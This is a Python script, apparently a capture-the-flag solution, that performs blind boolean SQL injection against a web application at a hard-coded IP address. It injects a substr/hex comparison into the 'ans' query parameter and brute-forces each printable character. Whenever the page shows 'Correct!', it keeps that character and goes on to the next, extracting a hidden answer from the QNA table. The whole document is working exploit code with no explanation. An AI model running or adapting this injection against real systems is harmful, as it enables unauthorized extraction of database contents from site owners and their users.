import requests
import string
import threading
flag=""
for i in range(20):
    for char in string.printable:
        try:
            burp0_url = f"http://34.126.139.50:10512/?qn_id=42&ans=1%27%20or%20(SELECT%20hex(substr(Answer,{i},1))%20FROM%20QNA+limit+1+offset+41)%20=%20hex(%27{char}%27)%20--%20-"
            burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
            req=requests.get(burp0_url, headers=burp0_headers)
            if "Correct!" in req.text:
                flag+=char
                print(flag)
                break
        except:
            pass

